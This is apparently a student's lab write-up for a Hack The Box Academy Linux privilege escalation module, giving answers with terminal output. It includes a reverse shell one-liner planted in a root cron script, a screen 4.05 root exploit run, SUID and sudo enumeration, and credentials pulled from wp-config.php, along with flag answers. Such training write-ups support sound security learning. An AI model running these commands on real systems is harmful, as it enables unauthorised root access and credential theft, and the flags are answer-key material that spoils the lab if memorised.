# Web Requests
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Linux Privilege Escalation
* Tier: II
* Difficulty: Easy
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Kernel Exploits
### Question:
![](./attachments/Pasted%20image%2020221116125927.png)

**Answer:** ``

---
## Vulnerable Services
### Question:
![](./attachments/Pasted%20image%2020221116125949.png)

```
┌──(kali㉿kali)-[/etc]
└─$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

```
┌──(kali㉿kali)-[/etc]
└─$ ssh htb-student@10.129.93.127   
htb-student@10.129.93.127's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

242 packages can be updated.
174 updates are security updates.


Last login: Wed Nov 16 12:50:06 2022 from 10.10.15.45
htb-student@NIX02:~$ touch script.sh
htb-student@NIX02:~$ nano script.sh

```

Insert the exploit code in `script.sh` and save.

```
htb-student@NIX02:~$ chmod +x script.sh
htb-student@NIX02:~$ ./script.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-htb-student.

# cat /root/screen_exploit/flag.txt
91927dad55ffd22825660da88f2f92e0
```

**Answer:** `91927dad55ffd22825660da88f2f92e0`

---
## Cron Job Abuse
### Question:
![](./attachments/Pasted%20image%2020221116133342.png)

```
htb-student@NIX02:~$ cat /dmz-backups/backup.sh
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 htb-student@NIX02:~$ nano /dmz-backups/backup.sh
```

Insert one-liner payload `bash -i >& /dev/tcp/10.10.15.45/443 0>&1` and save.

Then setup `netcat` to listen for the incoming connection.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.93.127.
Ncat: Connection from 10.129.93.127:45650.
bash: cannot set terminal process group (1884): Inappropriate ioctl for device
bash: no job control in this shell
root@NIX02:~# cat cron_abuse/flag.txt
cat cron_abuse/flag.txt
14347a2c977eb84508d3d50691a7ac4b
```

**Answer:** `14347a2c977eb84508d3d50691a7ac4b`

---
## Special Permissions
### Question 1:
![](./attachments/Pasted%20image%2020221116134354.png)

```
htb-student@NIX02:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 8816 Nov 16 12:55 /tmp/rootshell
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31  2020 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 73424 Feb 12  2016 /bin/sed
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31  2020 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9  2020 /sbin/mount.nfs
```

**Answer:** `/bin/sed`

### Question 2:
![](./attachments/Pasted%20image%2020221116134405.png)

```
htb-student@NIX02:~$ find / -uid 0 -perm -6000 -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/bin/facter
```

**Answer:** `/usr/bin/facter`

---
## Sudo Rights Abuse
### Question:
![](./attachments/Pasted%20image%2020221116135558.png)

```
htb-student@NIX02:~$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

**Answer:** `/usr/bin/openssl`

---
## Path Abuse
### Question:
![](./attachments/Pasted%20image%2020221116140516.png)

```
htb-student@NIX02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
```

**Answer:** `/tmp`

---
## 
### Question:
![](./attachments/Pasted%20image%2020221116141355.png)
*Hint: Look in the default WordPress configuration file.*

```
htb-student@NIX02:~$ ls /var/www/html
index.php    wp-activate.php     wp-comments-post.php  wp-content   wp-links-opml.php  wp-mail.php      wp-trackback.php
license.txt  wp-admin            wp-config.php         wp-cron.php  wp-load.php        wp-settings.php  xmlrpc.php
readme.html  wp-blog-header.php  wp-config-sample.php  wp-includes  wp-login.php       wp-signup.php
htb-student@NIX02:~$ cat /var/www/html/wp-config.php | grep 'DB_USER\|DB_PASSWORD'
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'W0rdpr3ss_sekur1ty!' );
htb-student@NIX02:~$
```

**Answer:** `W0rdpr3ss_sekur1ty!`

---
## 
### Question:


**Answer:** ``

---
## 
### Question:


**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]